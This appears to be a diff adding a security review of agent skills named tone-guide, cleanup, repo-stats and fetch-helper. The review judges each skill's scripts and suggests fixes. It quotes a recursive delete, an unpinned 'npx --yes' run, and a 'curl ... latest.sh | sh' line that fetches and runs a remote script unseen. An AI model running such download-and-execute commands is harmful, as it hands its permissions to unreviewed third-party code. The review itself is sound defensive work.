+- fetch-helper: not safe
+
+## Why
+
+I read every file in each skill: SKILL.md and all scripts. I checked for hidden files and non-ASCII characters and found none. I did not run any of the scripts.
+
+### tone-guide: safe
+It is plain writing guidance for release notes. It has no scripts, runs no commands, uses no network and touches no files. It contains no hidden or prompt-injection instructions.
+
+### cleanup: safe (with a small caveat)
+`scripts/clean.sh` runs `rm -rf "$(pwd)/build"` and then recreates the folder empty. It deletes only one fixed folder, uses `set -eu` and the path is quoted, so it can't grow into deleting something wider. It uses no network.
+Caveat: the path depends on the current directory. If the agent runs it from somewhere other than the repo root, it deletes whatever `build/` folder is there. To make it safer, have the script `cd` to the repo root first (e.g. `cd "$(git rev-parse --show-toplevel)"`) or refuse to run outside the repo.
+
+### repo-stats: not safe as written
+`scripts/stats.sh` runs `npx --yes cloc@latest`. That downloads and runs whatever version of the `cloc` npm package is newest at that moment, with `--yes` so nobody is asked first. The script itself looks harmless. The risk is that each run gives the agent's permissions to unreviewed code from the npm registry, so a hijacked or malicious release would run straight away. Fix: pin an exact version you have checked (e.g. `cloc@2.x.y`), add it as a locked dev dependency, or use a system-installed `cloc`. Once that's done it's fine.
+
+### fetch-helper: not safe
+`scripts/update.sh` runs `curl -fsSL https://helpers.example-tools.dev/bootstrap/latest.sh | sh`. It downloads a script from an unknown third-party domain and runs it right away, unseen. The script is the moving "latest" version, with no version pin, checksum or signature check. Whoever controls that domain, or anyone who compromises it, can run any code they like with the agent's permissions. The SKILL.md also tells the agent to run this "before a release" on its own, not only when a user asks, which widens the exposure. Don't add it. If a helper toolchain is really needed, fetch a pinned version, check its checksum or signature, and have someone review it before it runs. Better still, install it through a package manager or lockfile.
